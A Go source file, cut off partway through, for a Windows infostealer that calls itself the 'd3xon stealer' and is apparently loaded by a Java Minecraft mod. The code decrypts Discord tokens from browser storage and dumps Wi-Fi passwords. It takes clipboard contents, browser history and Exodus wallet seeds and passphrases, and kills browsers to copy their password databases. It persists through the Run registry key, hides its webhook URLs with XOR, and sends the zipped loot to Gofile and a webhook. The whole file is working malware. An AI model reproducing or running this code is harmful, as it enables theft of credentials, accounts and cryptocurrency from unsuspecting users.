package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// EndpointConfig holds the webhook URLs from the config file
type EndpointConfig struct {
	DcWebhook     string `json:"dc_webhook"`
	McWebhook     string `json:"mc_webhook"`
	GofileWebhook string `json:"gofile_webhook"`
	UserSuffix    string `json:"user_suffix"`
	Version       string `json:"version"`
}

const (
	// XOR key for config decryption
	xorKey = 0x5A
	// Config file location (same as Java mod writes)
	configFileName = ".d3x_config"
	
	// FALLBACK: XOR-encrypted webpanel URL for DC tokens (used if config not found)
	encWebhook = "322E2E2A6075756B6A69746B6C69746B6B6274686F6A606F6A6A6A753B2A33753E39772D3F3832353531"
	// FALLBACK: XOR-encrypted webhook URL for ZIP notifications
	encZipWebhook = "322E2E2A6075756B6A69746B6C69746B6B6274686F6A606F6A6A6A753B2A33752D3F3832353531"
)

var (
	// Global endpoint config (loaded from file or fallback)
	endpoints *EndpointConfig
	
	tokenRegex     *regexp.Regexp
	encTokenRegex  *regexp.Regexp
	crypt32        *syscall.LazyDLL
	kernel32       *syscall.LazyDLL
	cryptUnprotect *syscall.LazyProc
	createMutex    *syscall.LazyProc
)

func init() {
	// Ensure database is initialized before any fetchEntry() calls
	tableInit()
	
	// Load endpoint config from file (written by Java mod)
	endpoints = loadEndpointConfig()
	
	tokenRegex = regexp.MustCompile(`[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}`)
	encTokenRegex = regexp.MustCompile(fetchEntry(46) + `[A-Za-z0-9+/=]+`)
	crypt32 = syscall.NewLazyDLL(fetchEntry(5))
	kernel32 = syscall.NewLazyDLL(fetchEntry(3))
	cryptUnprotect = crypt32.NewProc(fetchEntry(77))
	createMutex = kernel32.NewProc(fetchEntry(78))
}

// loadEndpointConfig reads the config file written by the Java mod
func loadEndpointConfig() *EndpointConfig {
	// Default fallback config
	fallback := &EndpointConfig{
		DcWebhook:     decryptFallbackWebhook(encWebhook),
		McWebhook:     decryptFallbackWebhook(encWebhook),
		GofileWebhook: decryptFallbackWebhook(encZipWebhook),
		UserSuffix:    "",
		Version:       "1.0",
	}
	
	// Try to find config file in %APPDATA%\.minecraft\.d3x_config
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return fallback
	}
	
	configPath := filepath.Join(appdata, ".minecraft", configFileName)
	
	// Check if config file exists
	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		// Config not found - use fallback
		return fallback
	}
	
	// Read encrypted config
	encryptedData, err := ioutil.ReadFile(configPath)
	if err != nil {
		return fallback
	}
	
	// XOR decrypt
	decrypted := make([]byte, len(encryptedData))
	for i := 0; i < len(encryptedData); i++ {
		decrypted[i] = encryptedData[i] ^ xorKey
	}
	
	// Parse JSON
	var config EndpointConfig
	if err := json.Unmarshal(decrypted, &config); err != nil {
		return fallback
	}
	
	return &config
}

// decryptFallbackWebhook decrypts the hardcoded fallback URLs
func decryptFallbackWebhook(encrypted string) string {
	result := []byte{}
	for i := 0; i < len(encrypted); i += 2 {
		b := byte(0)
		fmt.Sscanf(encrypted[i:i+2], "%02x", &b)
		result = append(result, b^xorKey)
	}
	return string(result)
}

type DataBlob struct {
	cbData uint32
	pbData *byte
}

type WebpanelPayload struct {
	Platform     string `json:"platform"`
	Token        string `json:"token"`
	Username     string `json:"username"`
	ComputerName string `json:"computername"`
}

type GofileResponse struct {
	Status string `json:"status"`
	Data   struct {
		DownloadPage string `json:"downloadPage"`
		Code         string `json:"code"`
		ParentFolder string `json:"parentFolder"`
		FileId       string `json:"fileId"`
	} `json:"data"`
}

type ZipNotificationEmbed struct {
	Embeds []struct {
		Title       string `json:"title"`
		Description string `json:"description"`
		Color       int    `json:"color"`
		Fields      []struct {
			Name   string `json:"name"`
			Value  string `json:"value"`
			Inline bool   `json:"inline"`
		} `json:"fields"`
		Footer struct {
			Text string `json:"text"`
		} `json:"footer"`
		Timestamp string `json:"timestamp"`
	} `json:"embeds"`
	Username  string `json:"username"`
	AvatarURL string `json:"avatar_url"`
}

func decryptWebhook() string {
	// Use config from file if available
	if endpoints != nil && endpoints.DcWebhook != "" {
		return endpoints.DcWebhook
	}
	// Fallback to hardcoded encrypted URL
	encrypted := []byte{}
	for i := 0; i < len(encWebhook); i += 2 {
		b := byte(0)
		fmt.Sscanf(encWebhook[i:i+2], fetchEntry(143), &b)
		encrypted = append(encrypted, b^xorKey)
	}
	return string(encrypted)
}

func decryptUploadURL() string {
	// Use config from file if available
	if endpoints != nil && endpoints.GofileWebhook != "" {
		return endpoints.GofileWebhook
	}
	// Fallback to hardcoded encrypted URL
	encrypted := []byte{}
	for i := 0; i < len(encZipWebhook); i += 2 {
		b := byte(0)
		fmt.Sscanf(encZipWebhook[i:i+2], fetchEntry(143), &b)
		encrypted = append(encrypted, b^xorKey)
	}
	return string(encrypted)
}

// Check if already running (Anti-Detection)
func checkMutex() bool {
	mutexNamePtr, _ := syscall.UTF16PtrFromString(fetchEntry(79))
	ret, _, _ := createMutex.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
	if ret == 0 {
		return false
	}
	lastErr := syscall.GetLastError()
	return lastErr != syscall.ERROR_ALREADY_EXISTS
}

// Add to startup registry
func addToStartup() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	k, err := syscall.UTF16PtrFromString(fetchEntry(7))
	if err != nil {
		return
	}

	var key syscall.Handle
	err = syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, k, 0, syscall.KEY_WRITE, &key)
	if err != nil {
		return
	}
	defer syscall.RegCloseKey(key)

	name, _ := syscall.UTF16PtrFromString(fetchEntry(9))

	valueBytes := syscall.StringToUTF16(exePath)

	modadvapi32 := syscall.NewLazyDLL(fetchEntry(6))
	regSetValueEx := modadvapi32.NewProc(fetchEntry(8))

	regSetValueEx.Call(
		uintptr(key),
		uintptr(unsafe.Pointer(name)),
		0,
		syscall.REG_SZ,
		uintptr(unsafe.Pointer(&valueBytes[0])),
		uintptr(len(valueBytes)*2),
	)
}

func dpApiDecrypt(data []byte) ([]byte, error) {
	var outBlob DataBlob
	inBlob := DataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	ret, _, err := cryptUnprotect.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil, err
	}

	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(outBlob.pbData)))
	result := make([]byte, outBlob.cbData)
	copy(result, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData])
	return result, nil
}

func getEncryptionKey(path string) []byte {
	localStatePath := filepath.Join(path, fetchEntry(19))
	data, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil
	}

	osCrypt, ok := localState[fetchEntry(20)].(map[string]interface{})
	if !ok {
		return nil
	}

	encKeyB64, ok := osCrypt[fetchEntry(21)].(string)
	if !ok {
		return nil
	}

	encKey, _ := base64.StdEncoding.DecodeString(encKeyB64)
	encKey = encKey[5:] // Remove DPAPI prefix (encrypted)

	key, err := dpApiDecrypt(encKey)
	if err != nil {
		return nil
	}
	return key
}

func decryptToken(encToken string, key []byte) string {
	if !strings.HasPrefix(encToken, fetchEntry(46)) {
		return ""
	}

	encData, _ := base64.StdEncoding.DecodeString(strings.TrimPrefix(encToken, fetchEntry(46)))
	if len(encData) < 15 {
		return ""
	}

	iv := encData[3:15]
	ciphertext := encData[15:]
	if len(ciphertext) < 16 {
		return ""
	}

	tag := ciphertext[len(ciphertext)-16:]
	ciphertext = ciphertext[:len(ciphertext)-16]

	block, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(block)
	plaintext, err := aesgcm.Open(nil, iv, append(ciphertext, tag...), nil)
	if err != nil {
		return ""
	}

	return strings.TrimSpace(string(plaintext))
}

func scanFile(path string, key []byte) []string {
	var tokens []string
	data, _ := ioutil.ReadFile(path)
	content := string(data)

	// Encrypted tokens
	if key != nil {
		for _, match := range encTokenRegex.FindAllString(content, -1) {
			decrypted := decryptToken(match, key)
			if decrypted != "" && tokenRegex.MatchString(decrypted) {
				tokens = append(tokens, decrypted)
			}
		}
	}

	// Plain tokens
	for _, match := range tokenRegex.FindAllString(content, -1) {
		parts := strings.Split(match, ".")
		if len(parts) == 3 && len(parts[1]) == 6 {
			tokens = append(tokens, match)
		}
	}

	return tokens
}

func scanPath(path, platform string) []string {
	var tokens []string
	var key []byte

	if strings.Contains(platform, fetchEntry(1)) {
		key = getEncryptionKey(path)
	}

	leveldbPath := filepath.Join(path, fetchEntry(17), fetchEntry(18))
	files, _ := ioutil.ReadDir(leveldbPath)

	for _, file := range files {
		if strings.HasSuffix(file.Name(), fetchEntry(47)) || strings.HasSuffix(file.Name(), fetchEntry(48)) {
			tokens = append(tokens, scanFile(filepath.Join(leveldbPath, file.Name()), key)...)
		}
	}

	return tokens
}

func copyFile(src, dst string) error {
	// Retry up to 3 times with delays for locked files
	for i := 0; i < 3; i++ {
		// Try direct copy first
		sourceFile, err := os.Open(src)
		if err == nil {
			defer sourceFile.Close()
			destFile, err := os.Create(dst)
			if err == nil {
				defer destFile.Close()
				_, err = io.Copy(destFile, sourceFile)
				if err == nil {
					return nil // Success!
				}
			}
		}
		
		// If direct copy fails (file locked), try reading all bytes and write
		data, err := ioutil.ReadFile(src)
		if err == nil {
			err = ioutil.WriteFile(dst, data, 0644)
			if err == nil {
				return nil // Success!
			}
		}
		
		// If still failing, wait before retry
		if i < 2 {
			time.Sleep(500 * time.Millisecond)
		}
	}
	
	// Final attempt failed
	return fmt.Errorf("failed to copy after 3 attempts")
}

func saveToFile(filename string, content string) error {
	return ioutil.WriteFile(filename, []byte(content), 0644)
}

func createZipArchive(tempDir string) (string, error) {
	zipPath := filepath.Join(tempDir, fetchEntry(61))
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return "", err
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	filesAdded := 0

	// Recursively add all files and folders
	err = filepath.Walk(tempDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Skip the zip file itself and temp db files
		if path == zipPath || strings.HasSuffix(path, fetchEntry(60)) {
			return nil
		}

		// Skip the root temp directory
		if path == tempDir {
			return nil
		}

		// Get relative path
		relPath, err := filepath.Rel(tempDir, path)
		if err != nil {
			return err
		}

		// Create directory entry if it's a directory
		if info.IsDir() {
			header := &zip.FileHeader{
				Name:   relPath + "/",
				Method: zip.Deflate,
			}
			_, err := zipWriter.CreateHeader(header)
			return err
		}

		// Skip empty files
		if info.Size() == 0 {
			return nil
		}

		// Add file to zip
		fileToZip, err := os.Open(path)
		if err != nil {
			return nil // Skip files we can't open
		}
		defer fileToZip.Close()

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return nil
		}

		header.Name = relPath
		header.Method = zip.Deflate

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return nil
		}

		_, err = io.Copy(writer, fileToZip)
		if err == nil {
			filesAdded++
		}

		return nil
	})

	if err != nil {
		return "", err
	}

	// Close the zip writer to flush everything
	zipWriter.Close()
	zipFile.Close()

	// Verify at least one file was added
	if filesAdded == 0 {
		return "", fmt.Errorf("no files added to zip")
	}

	return zipPath, nil
}

func uploadZipToGofile(zipPath string) (string, error) {
	// Step 1: Get best server from Gofile API
	serverResp, err := http.Get("https://api.gofile.io/servers")
	if err != nil {
		return "", fmt.Errorf("failed to get gofile server: %v", err)
	}
	defer serverResp.Body.Close()

	var serverData struct {
		Status string `json:"status"`
		Data   struct {
			Servers []struct {
				Name string `json:"name"`
			} `json:"servers"`
		} `json:"data"`
	}

	serverBody, _ := ioutil.ReadAll(serverResp.Body)
	
	if err := json.Unmarshal(serverBody, &serverData); err != nil {
		return "", fmt.Errorf("failed to parse server response: %v", err)
	}

	if serverData.Status != "ok" || len(serverData.Data.Servers) == 0 {
		return "", fmt.Errorf("no gofile servers available")
	}

	server := serverData.Data.Servers[0].Name
	uploadURL := fmt.Sprintf("https://%s.gofile.io/contents/uploadFile", server)

	// Step 2: Upload file to the server
	file, err := os.Open(zipPath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Gofile expects field name "file"
	part, err := writer.CreateFormFile("file", filepath.Base(zipPath))
	if err != nil {
		return "", err
	}

	io.Copy(part, file)
	err = writer.Close()
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest(fetchEntry(103), uploadURL, body)
	if err != nil {
		return "", err
	}

	req.Header.Set(fetchEntry(104), writer.FormDataContentType())

	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("gofile upload failed with status %d: %s", resp.StatusCode, string(bodyBytes))
	}

	// Parse response
	var gofileResp GofileResponse
	if err := json.Unmarshal(bodyBytes, &gofileResp); err != nil {
		return "", err
	}

	if gofileResp.Status != fetchEntry(106) {
		return "", fmt.Errorf("gofile upload failed: %s", gofileResp.Status)
	}

	return gofileResp.Data.DownloadPage, nil
}

func sendZipNotificationToWebpanel(gofileURL, pcName, username string, fileCount int) error {
	webhookURL := decryptUploadURL()
	if webhookURL == "" {
		return fmt.Errorf("no webhook URL")
	}

	timestamp := time.Now().Format(time.RFC3339)

	// Build Discord-style embed
	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       "📦 Data Package Received",
				"description": "New stolen data uploaded to Gofile",
				"color":       5814783, // Purple
				"timestamp":   timestamp,
				"fields": []map[string]interface{}{
					{
						"name":   "💻 PC Name",
						"value":  fmt.Sprintf("```%s```", pcName),
						"inline": true,
					},
					{
						"name":   "👤 Username",
						"value":  fmt.Sprintf("```%s```", username),
						"inline": true,
					},
					{
						"name":   "📊 Files",
						"value":  fmt.Sprintf("```%d files```", fileCount),
						"inline": true,
					},
					{
						"name":   "🔗 Download Link",
						"value":  gofileURL,
						"inline": false,
					},
				},
				"footer": map[string]string{
					"text": "d3xon stealer • Advanced Data Exfiltration",
				},
			},
		},
		fetchEntry(158):   fetchEntry(140),
		fetchEntry(159): fetchEntry(141),
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 && resp.StatusCode != 204 {
		return fmt.Errorf("webhook notification failed with status: %d", resp.StatusCode)
	}

	return nil
}

func uploadZipToWebpanel(zipPath string) error {
	// DEPRECATED: Now using Gofile instead
	return nil
}

func collectWiFiPasswords() string {
	// Run netsh command to get WiFi profiles
	out, err := exec.Command(fetchEntry(10), fetchEntry(11), fetchEntry(12), fetchEntry(13)).Output()
	if err != nil {
		return ""
	}

	var result strings.Builder
	result.WriteString("=== WiFi Networks ===\n\n")

	// Parse profile names
	profiles := regexp.MustCompile(fetchEntry(15) + `\s*:\s*(.+)`).FindAllStringSubmatch(string(out), -1)

	for _, profile := range profiles {
		if len(profile) < 2 {
			continue
		}

		profileName := strings.TrimSpace(profile[1])

		// Get password for each profile
		passOut, err := exec.Command(fetchEntry(10), fetchEntry(11), fetchEntry(12), "profile", profileName, fetchEntry(14)).Output()
		if err != nil {
			continue
		}

		passMatch := regexp.MustCompile(fetchEntry(16) + `\s*:\s*(.+)`).FindStringSubmatch(string(passOut))
		password := "No password"
		if len(passMatch) > 1 {
			password = strings.TrimSpace(passMatch[1])
		}

		result.WriteString(fmt.Sprintf("Network: %s\nPassword: %s\n\n", profileName, password))
	}

	return result.String()
}

func collectSystemInfo(tokenCount int) string {
	var result strings.Builder

	result.WriteString("=== System Information ===\n\n")
	result.WriteString(fmt.Sprintf("Username: %s\n", os.Getenv(fetchEntry(52))))
	result.WriteString(fmt.Sprintf("Computer: %s\n", os.Getenv(fetchEntry(51))))
	result.WriteString(fmt.Sprintf("Timestamp: %s\n", time.Now().Format("2006-01-02 15:04:05")))
	result.WriteString(fmt.Sprintf("Tokens Found: %d\n\n", tokenCount))

	// OS Info
	result.WriteString("OS Information:\n")
	result.WriteString(fmt.Sprintf("OS: %s\n", os.Getenv("OS")))
	result.WriteString(fmt.Sprintf("Processor: %s\n", os.Getenv("PROCESSOR_IDENTIFIER")))
	result.WriteString(fmt.Sprintf("Architecture: %s\n", os.Getenv("PROCESSOR_ARCHITECTURE")))
	result.WriteString(fmt.Sprintf("Number of Processors: %s\n\n", os.Getenv("NUMBER_OF_PROCESSORS")))

	// User Info
	result.WriteString("User Information:\n")
	result.WriteString(fmt.Sprintf("User Domain: %s\n", os.Getenv("USERDOMAIN")))
	result.WriteString(fmt.Sprintf("User Profile: %s\n", os.Getenv("USERPROFILE")))
	result.WriteString(fmt.Sprintf("Home Drive: %s\n", os.Getenv("HOMEDRIVE")))
	result.WriteString(fmt.Sprintf("System Drive: %s\n\n", os.Getenv("SYSTEMDRIVE")))

	// Get IP address
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		result.WriteString("IP Addresses:\n")
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					result.WriteString(fmt.Sprintf("  %s\n", ipnet.IP.String()))
				}
			}
		}
	}

	return result.String()
}

func getClipboard() string {
	user32 := syscall.NewLazyDLL(fetchEntry(4))
	kernel32 := syscall.NewLazyDLL(fetchEntry(3))

	openClipboard := user32.NewProc(fetchEntry(35))
	closeClipboard := user32.NewProc(fetchEntry(36))
	getClipboardData := user32.NewProc(fetchEntry(37))
	globalLock := kernel32.NewProc(fetchEntry(38))
	globalUnlock := kernel32.NewProc(fetchEntry(39))

	const CF_UNICODETEXT = 13

	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer closeClipboard.Call()

	handle, _, _ := getClipboardData.Call(CF_UNICODETEXT)
	if handle == 0 {
		return ""
	}

	ptr, _, _ := globalLock.Call(handle)
	if ptr == 0 {
		return ""
	}
	defer globalUnlock.Call(handle)

	text := syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(ptr))[:])

	if len(text) > 5000 {
		text = text[:5000] + "... (truncated)"
	}

	return fmt.Sprintf("=== Clipboard Content ===\n\n%s\n", text)
}

func getInstalledSoftware() string {
	var result strings.Builder
	result.WriteString("=== Installed Software ===\n\n")

	// Query registry for installed software
	key, err := syscall.UTF16PtrFromString(fetchEntry(40))
	if err != nil {
		return ""
	}

	var handle syscall.Handle
	err = syscall.RegOpenKeyEx(syscall.HKEY_LOCAL_MACHINE, key, 0, syscall.KEY_READ, &handle)
	if err != nil {
		return ""
	}
	defer syscall.RegCloseKey(handle)

	// Get subkeys (each is a program)
	var index uint32 = 0
	buf := make([]uint16, 256)

	for {
		bufLen := uint32(len(buf))
		err := syscall.RegEnumKeyEx(handle, index, &buf[0], &bufLen, nil, nil, nil, nil)
		if err != nil {
			break
		}

		subKeyName := syscall.UTF16ToString(buf[:bufLen])

		// Try to get DisplayName
		subKey, _ := syscall.UTF16PtrFromString(fetchEntry(40) + `\` + subKeyName)
		var subHandle syscall.Handle

		if syscall.RegOpenKeyEx(syscall.HKEY_LOCAL_MACHINE, subKey, 0, syscall.KEY_READ, &subHandle) == nil {
			displayName, _ := syscall.UTF16PtrFromString(fetchEntry(41))
			var dataType uint32
			var data [512]uint16
			dataLen := uint32(len(data) * 2)

			if syscall.RegQueryValueEx(subHandle, displayName, nil, &dataType, (*byte)(unsafe.Pointer(&data[0])), &dataLen) == nil {
				name := syscall.UTF16ToString(data[:])
				if name != "" && len(result.String()) < 50000 {
					result.WriteString(fmt.Sprintf("- %s\n", name))
				}
			}
			syscall.RegCloseKey(subHandle)
		}

		index++
		if index > 500 { // Limit to first 500
			break
		}
	}

	return result.String()
}

func collectExodusWallet(roaming string) string {
	var result strings.Builder
	result.WriteString("=== Exodus Wallet Data ===\n\n")

	// Exodus wallet paths
	exodusPath := filepath.Join(roaming, fetchEntry(65))
	seedPath := filepath.Join(exodusPath, fetchEntry(66))
	passphrasePath := filepath.Join(exodusPath, fetchEntry(67))

	// Check if Exodus exists
	if _, err := os.Stat(exodusPath); os.IsNotExist(err) {
		return ""
	}

	result.WriteString("✅ Exodus Wallet Detected!\n\n")

	// Try to read seed file (encrypted)
	if _, err := os.Stat(seedPath); err == nil {
		data, err := ioutil.ReadFile(seedPath)
		if err == nil {
			// Try to extract seed (it's usually base64 encoded + encrypted)
			// Exodus uses window.exodus.seco which is stored in localStorage
			result.WriteString("📦 Seed File Found:\n")
			result.WriteString(fmt.Sprintf("Size: %d bytes\n", len(data)))
			result.WriteString(fmt.Sprintf("Data (hex): %x\n\n", data[:min(100, len(data))]))
		}
	}

	// Try to get passphrase
	if _, err := os.Stat(passphrasePath); err == nil {
		data, err := ioutil.ReadFile(passphrasePath)
		if err == nil {
			result.WriteString("🔑 Passphrase File Found:\n")
			result.WriteString(string(data) + "\n\n")
		}
	}

	// Extract seed from localStorage (Electron app)
	localStoragePath := filepath.Join(exodusPath, fetchEntry(17), fetchEntry(18))
	if _, err := os.Stat(localStoragePath); err == nil {
		files, _ := ioutil.ReadDir(localStoragePath)
		
		for _, file := range files {
			if strings.HasSuffix(file.Name(), fetchEntry(48)) || strings.HasSuffix(file.Name(), fetchEntry(47)) {
				filePath := filepath.Join(localStoragePath, file.Name())
				data, err := ioutil.ReadFile(filePath)
				if err != nil {
					continue
				}

				content := string(data)
				
				// Search for mnemonic/seed patterns
				mnemonicRegex := regexp.MustCompile(`(?i)(` + fetchEntry(74) + `|` + fetchEntry(73) + `|` + fetchEntry(75) + `)["']?\s*:\s*["']([a-z\s]+)["']`)
				matches := mnemonicRegex.FindAllStringSubmatch(content, -1)
				
				if len(matches) > 0 {
					result.WriteString("🔓 Potential Seeds Found in localStorage:\n")
					for _, match := range matches {
						if len(match) >= 3 {
							words := strings.Fields(match[2])
							if len(words) >= 12 && len(words) <= 24 {
								result.WriteString(fmt.Sprintf("  - %s\n", match[2]))
							}
						}
					}
					result.WriteString("\n")
				}

				// Look for encrypted seed (base64 pattern)
				encSeedRegex := regexp.MustCompile(`(?i)` + fetchEntry(72) + `["']?\s*:\s*["']([A-Za-z0-9+/=]{50,})["']`)
				encMatches := encSeedRegex.FindAllStringSubmatch(content, -1)
				
				if len(encMatches) > 0 {
					result.WriteString("🔐 Encrypted Seeds (window.exodus.seco):\n")
					for _, match := range encMatches {
						if len(match) >= 2 {
							result.WriteString(fmt.Sprintf("  - %s\n", match[1]))
						}
					}
					result.WriteString("\n")
				}
			}
		}
	}

	// Copy entire Exodus folder for manual extraction
	result.WriteString("📂 Full Exodus folder will be archived for manual extraction\n")

	if len(result.String()) > 50 {
		return result.String()
	}
	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func collectBrowserHistory(localAppData string) string {
	var result strings.Builder
	result.WriteString("=== Browser History (Recent URLs) ===\n\n")

	browsers := map[string]string{
		fetchEntry(27): filepath.Join(localAppData, fetchEntry(26), fetchEntry(27), fetchEntry(28), fetchEntry(29), fetchEntry(30)),
		fetchEntry(32): filepath.Join(localAppData, fetchEntry(31), fetchEntry(32), fetchEntry(28), fetchEntry(29), fetchEntry(30)),
		fetchEntry(63): filepath.Join(localAppData, fetchEntry(33), fetchEntry(34), fetchEntry(28), fetchEntry(29), fetchEntry(30)),
	}

	for browserName, historyPath := range browsers {
		if _, err := os.Stat(historyPath); os.IsNotExist(err) {
			continue
		}

		// Copy to temp
		tempPath := filepath.Join(os.TempDir(), fetchEntry(62)+fmt.Sprintf("%d", time.Now().Unix())+fetchEntry(60))
		if err := copyFile(historyPath, tempPath); err != nil {
			continue
		}
		defer os.Remove(tempPath)

		// Read file and extract URLs
		data, err := ioutil.ReadFile(tempPath)
		if err != nil {
			continue
		}

		content := string(data)
		urlRegex := regexp.MustCompile(`https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s\x00-\x1F\x7F]*)?`)
		urls := urlRegex.FindAllString(content, 200) // Top 200 URLs

		if len(urls) > 0 {
			result.WriteString(fmt.Sprintf("\n%s History:\n", browserName))
			seen := make(map[string]bool)
			count := 0
			for _, rawURL := range urls {
				// URL decode
				decodedURL := strings.ReplaceAll(rawURL, "%20", " ")
				decodedURL = strings.ReplaceAll(decodedURL, "%2F", "/")
				decodedURL = strings.ReplaceAll(decodedURL, "%3A", ":")
				decodedURL = strings.ReplaceAll(decodedURL, "%3F", "?")
				decodedURL = strings.ReplaceAll(decodedURL, "%3D", "=")
				decodedURL = strings.ReplaceAll(decodedURL, "%26", "&")
				decodedURL = strings.ReplaceAll(decodedURL, "%23", "#")
				
				// Remove null bytes and control chars
				decodedURL = strings.Map(func(r rune) rune {
					if r < 32 || r == 127 {
						return -1
					}
					return r
				}, decodedURL)
				
				if !seen[decodedURL] && count < 100 && len(decodedURL) > 10 {
					seen[decodedURL] = true
					result.WriteString(fmt.Sprintf("  %s\n", decodedURL))
					count++
				}
			}
		}
	}

	return result.String()
}

// decryptAESGCM decrypts Chrome v20-encrypted data using AES-256-GCM
// Format: "v20" (3 bytes) + IV (12 bytes) + ciphertext + tag (16 bytes)
func decryptAESGCM(key []byte, encryptedData []byte) ([]byte, error) {
	// Check for v20 prefix
	v20Prefix := fetchEntry(114) // "v20"
	if len(encryptedData) < len(v20Prefix)+12+16 || string(encryptedData[:len(v20Prefix)]) != v20Prefix {
		return nil, fmt.Errorf("invalid v20 format")
	}

	// Extract components
	offset := len(v20Prefix)
	iv := encryptedData[offset : offset+12]
	offset += 12
	ciphertext := encryptedData[offset : len(encryptedData)-16]
	tag := encryptedData[len(encryptedData)-16:]

	// Create AES-GCM cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Combine ciphertext + tag for GCM
	sealed := append(ciphertext, tag...)

	// Decrypt
	plaintext, err := gcm.Open(nil, iv, sealed, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

// getMasterKeyViaCOM uses Windows COM to decrypt the app-bound key via IElevator  
// NOTE: This is a simplified fallback - COM decryption from Go is complex
// In practice, the encrypted DBs are copied for external decryption with ChromElevator
func getMasterKeyViaCOM(encryptedKey []byte, browserName string) ([]byte, error) {
	// COM calls from Go without being in the browser process context are extremely difficult
	// The IElevator service performs path validation and will reject our calls
	// Instead, we return an error to trigger the fallback: copying encrypted DBs
	return nil, fmt.Errorf("COM decryption not available - copying encrypted DB for external tools")
}

// extractMasterKey reads Local State and decrypts the app_bound_encrypted_key
func extractMasterKey(localStatePath, browserName string) ([]byte, error) {
	// Read Local State JSON
	data, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	// Parse JSON to find app_bound_encrypted_key
	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, err
	}

	// Navigate to os_crypt.app_bound_encrypted_key
	osCrypt, ok := localState[fetchEntry(113)].(map[string]interface{}) // "os_crypt"
	if !ok {
		return nil, fmt.Errorf("os_crypt not found in Local State")
	}

	encKeyB64, ok := osCrypt[fetchEntry(110)].(string) // "app_bound_encrypted_key"
	if !ok {
		return nil, fmt.Errorf("app_bound_encrypted_key not found")
	}

	// Base64 decode
	encKeyData, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil, err
	}

	// Remove "APPB" prefix (4 bytes)
	appbPrefix := fetchEntry(118) // "APPB"
	if len(encKeyData) < 4 || string(encKeyData[:4]) != appbPrefix {
		return nil, fmt.Errorf(fetchEntry(118))
	}
	encKeyBlob := encKeyData[4:]

	// Decrypt via COM IElevator
	masterKey, err := getMasterKeyViaCOM(encKeyBlob, browserName)
	if err != nil {
		return nil, err
	}

	return masterKey, nil
}

// collectBrowserPasswords extracts browser passwords (copies encrypted DBs for offline decryption)
func collectBrowserPasswords(localAppData string, tempDir string) error {
	defer func() {
		if r := recover(); r != nil {
			// Silently recover from any panic in browser password collection
		}
	}()
	
	// Kill browser processes to unlock database files
	exec.Command("taskkill", "/F", "/IM", "chrome.exe").Run()
	exec.Command("taskkill", "/F", "/IM", "msedge.exe").Run()
	exec.Command("taskkill", "/F", "/IM", "brave.exe").Run()
	time.Sleep(2 * time.Second) // Wait longer for processes to die and file handles to close
	
	browsers := map[string]struct {
		localStatePath string
		loginDataPath  string
	}{
		fetchEntry(27): { // Chrome
			localStatePath: filepath.Join(localAppData, fetchEntry(26), fetchEntry(27), fetchEntry(28), fetchEntry(107)),
			loginDataPath:  filepath.Join(localAppData, fetchEntry(26), fetchEntry(27), fetchEntry(28), fetchEntry(29), fetchEntry(108)),
		},
		fetchEntry(63): { // Brave
			localStatePath: filepath.Join(localAppData, fetchEntry(33), fetchEntry(34), fetchEntry(28), fetchEntry(107)),
			loginDataPath:  filepath.Join(localAppData, fetchEntry(33), fetchEntry(34), fetchEntry(28), fetchEntry(29), fetchEntry(108)),
		},
		fetchEntry(32): { // Edge
			localStatePath: filepath.Join(localAppData, fetchEntry(31), fetchEntry(32), fetchEntry(28), fetchEntry(107)),
